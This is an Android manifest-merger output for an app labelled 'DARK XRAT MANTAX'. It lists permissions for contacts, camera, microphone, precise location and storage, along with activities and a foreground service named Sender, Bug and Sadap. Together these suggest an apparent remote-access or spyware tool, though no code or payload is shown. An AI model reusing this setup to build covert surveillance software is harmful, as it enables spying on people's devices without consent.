@@ -1,0 +1,220 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.darkxrat.mantax"
+4    android:versionCode="1"
+5    android:versionName="1.0" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="21"
+9        android:targetSdkVersion="34" />
+10
+11    <uses-permission android:name="android.permission.INTERNET" />
+11-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:5:5-66
+11-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:5:22-64
+12    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+12-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:6:5-78
+12-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:6:22-76
+13    <uses-permission android:name="android.permission.READ_CONTACTS" />
+13-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:7:5-71
+13-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:7:22-69
+14    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+14-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:8:5-80
+14-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:8:22-78
+15    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+15-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:9:5-79
+15-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:9:22-77
+16    <uses-permission android:name="android.permission.CAMERA" />
+16-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:10:5-64
+16-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:10:22-62
+17    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+17-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:11:5-70
+17-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:11:22-68
+18    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+18-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:12:5-78
+18-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:12:22-76
+19    <uses-permission android:name="android.permission.VIBRATE" />
+19-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:13:5-65
+19-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:13:22-63
+20    <uses-permission android:name="android.permission.WAKE_LOCK" />
+20-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:14:5-67
+20-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:14:22-65
+21    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+21-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:15:5-76
+21-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:15:22-74
+22
+23    <permission
+23-->[androidx.core:core:1.9.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/be041eb7ac8d90fdb70618a68cefe5c0/transformed/core-1.9.0/AndroidManifest.xml:22:5-24:47
+24        android:name="com.darkxrat.mantax.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+24-->[androidx.core:core:1.9.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/be041eb7ac8d90fdb70618a68cefe5c0/transformed/core-1.9.0/AndroidManifest.xml:23:9-81
+25        android:protectionLevel="signature" />
+25-->[androidx.core:core:1.9.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/be041eb7ac8d90fdb70618a68cefe5c0/transformed/core-1.9.0/AndroidManifest.xml:24:9-44
+26
+27    <uses-permission android:name="com.darkxrat.mantax.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+27-->[androidx.core:core:1.9.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/be041eb7ac8d90fdb70618a68cefe5c0/transformed/core-1.9.0/AndroidManifest.xml:26:5-97
+27-->[androidx.core:core:1.9.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/be041eb7ac8d90fdb70618a68cefe5c0/transformed/core-1.9.0/AndroidManifest.xml:26:22-94
+28
+29    <application
+29-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:17:5-48:19
+30        android:allowBackup="true"
+30-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:18:9-35
+31        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+31-->[androidx.core:core:1.9.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/be041eb7ac8d90fdb70618a68cefe5c0/transformed/core-1.9.0/AndroidManifest.xml:28:18-86
+32        android:debuggable="true"
+33        android:extractNativeLibs="true"
+34        android:icon="@mipmap/ic_launcher"
+34-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:19:9-43
+35        android:label="DARK XRAT MANTAX"
+35-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:20:9-41
+36        android:theme="@style/Theme.DarkXratMantax"
+36-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:21:9-52
+37        android:usesCleartextTraffic="true" >
+37-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:22:9-44
+38        <activity
+38-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:24:9-32:20
+39            android:name="com.darkxrat.mantax.SplashActivity"
+39-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:25:13-43
+40            android:exported="true"
+40-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:26:13-36
+41            android:theme="@style/Theme.DarkXratMantax.FullScreen" >
+41-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:27:13-67
+42            <intent-filter>
+42-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:28:13-31:29
+43                <action android:name="android.intent.action.MAIN" />
+43-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:29:17-68
+43-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:29:25-66
+44
+45                <category android:name="android.intent.category.LAUNCHER" />
+45-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:30:17-76
+45-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:30:27-74
+46            </intent-filter>
+47        </activity>
+48        <activity
+48-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:34:9-75
+49            android:name="com.darkxrat.mantax.LoginActivity"
+49-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:34:19-48
+50            android:exported="false" />
+50-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:34:49-73
+51        <activity
+51-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:35:9-74
+52            android:name="com.darkxrat.mantax.MainActivity"
+52-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:35:19-47
+53            android:exported="false" />
+53-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:35:48-72
+54        <activity
+54-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:36:9-73
+55            android:name="com.darkxrat.mantax.BugActivity"
+55-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:36:19-46
+56            android:exported="false" />
+56-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:36:47-71
+57        <activity
+57-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:37:9-76
+58            android:name="com.darkxrat.mantax.SenderActivity"
+58-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:37:19-49
+59            android:exported="false" />
+59-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:37:50-74
+60        <activity
+60-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:38:9-75
+61            android:name="com.darkxrat.mantax.SadapActivity"
+61-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:38:19-48
+62            android:exported="false" />
+62-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:38:49-73
+63        <activity
+63-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:39:9-75
+64            android:name="com.darkxrat.mantax.ToolsActivity"
+64-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:39:19-48
+65            android:exported="false" />
+65-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:39:49-73
+66        <activity
+66-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:40:9-77
+67            android:name="com.darkxrat.mantax.ProfileActivity"
+67-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:40:19-50
+68            android:exported="false" />
+68-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:40:51-75
+69        <activity
+69-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:41:9-78
+70            android:name="com.darkxrat.mantax.SettingsActivity"
+70-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:41:19-51
+71            android:exported="false" />
+71-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:41:52-76
+72        <activity
+72-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:42:9-84
+73            android:name="com.darkxrat.mantax.RoleManagementActivity"
+73-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:42:19-57
+74            android:exported="false" />
+74-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:42:58-82
+75
+76        <service
+76-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:44:9-46:55
+77            android:name="com.darkxrat.mantax.service.SenderService"
+77-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:45:13-50
+78            android:foregroundServiceType="dataSync" />
+78-->/storage/emulated/0/DarkXratMantax/app/src/main/AndroidManifest.xml:46:13-53
+79
+80        <provider
+80-->[androidx.emoji2:emoji2:1.2.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/443e7c98ee1d6bf3d0d2cd36a59d0e75/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:24:9-32:20
+81            android:name="androidx.startup.InitializationProvider"
+81-->[androidx.emoji2:emoji2:1.2.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/443e7c98ee1d6bf3d0d2cd36a59d0e75/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:25:13-67
+82            android:authorities="com.darkxrat.mantax.androidx-startup"
+82-->[androidx.emoji2:emoji2:1.2.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/443e7c98ee1d6bf3d0d2cd36a59d0e75/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:26:13-68
+83            android:exported="false" >
+83-->[androidx.emoji2:emoji2:1.2.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/443e7c98ee1d6bf3d0d2cd36a59d0e75/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:27:13-37
+84            <meta-data
+84-->[androidx.emoji2:emoji2:1.2.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/443e7c98ee1d6bf3d0d2cd36a59d0e75/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:29:13-31:52
+85                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+85-->[androidx.emoji2:emoji2:1.2.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/443e7c98ee1d6bf3d0d2cd36a59d0e75/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:30:17-75
+86                android:value="androidx.startup" />
+86-->[androidx.emoji2:emoji2:1.2.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/443e7c98ee1d6bf3d0d2cd36a59d0e75/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:31:17-49
+87            <meta-data
+87-->[androidx.lifecycle:lifecycle-process:2.6.1] /data/data/com.termux/files/home/.gradle/caches/transforms-3/1b22b91c2dbad1dd3797471e7962ba46/transformed/jetified-lifecycle-process-2.6.1/AndroidManifest.xml:29:13-31:52
+88                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+88-->[androidx.lifecycle:lifecycle-process:2.6.1] /data/data/com.termux/files/home/.gradle/caches/transforms-3/1b22b91c2dbad1dd3797471e7962ba46/transformed/jetified-lifecycle-process-2.6.1/AndroidManifest.xml:30:17-78
+89                android:value="androidx.startup" />
+89-->[androidx.lifecycle:lifecycle-process:2.6.1] /data/data/com.termux/files/home/.gradle/caches/transforms-3/1b22b91c2dbad1dd3797471e7962ba46/transformed/jetified-lifecycle-process-2.6.1/AndroidManifest.xml:31:17-49
+90            <meta-data
+90-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:29:13-31:52
+91                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
+91-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:30:17-85
+92                android:value="androidx.startup" />
+92-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:31:17-49
+93        </provider>
+94
+95        <receiver
+95-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:34:9-52:20
+96            android:name="androidx.profileinstaller.ProfileInstallReceiver"
+96-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:35:13-76
+97            android:directBootAware="false"
+97-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:36:13-44
+98            android:enabled="true"
+98-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:37:13-35
+99            android:exported="true"
+99-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:38:13-36
+100            android:permission="android.permission.DUMP" >
+100-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:39:13-57
+101            <intent-filter>
+101-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:40:13-42:29
+102                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
+102-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:41:17-91
+102-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:41:25-88
+103            </intent-filter>
+104            <intent-filter>
+104-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:43:13-45:29
+105                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
+105-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:44:17-85
+105-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:44:25-82
+106            </intent-filter>
+107            <intent-filter>
+107-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:46:13-48:29
+108                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
+108-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:47:17-88
+108-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:47:25-85
+109            </intent-filter>
+110            <intent-filter>
+110-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:49:13-51:29
+111                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
+111-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:50:17-95
+111-->[androidx.profileinstaller:profileinstaller:1.3.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/7bfcc2a5dcd9642ac7f3859ab90b5bb5/transformed/jetified-profileinstaller-1.3.0/AndroidManifest.xml:50:25-92
+112            </intent-filter>
+113        </receiver>
+114    </application>
+115
+116</manifest>
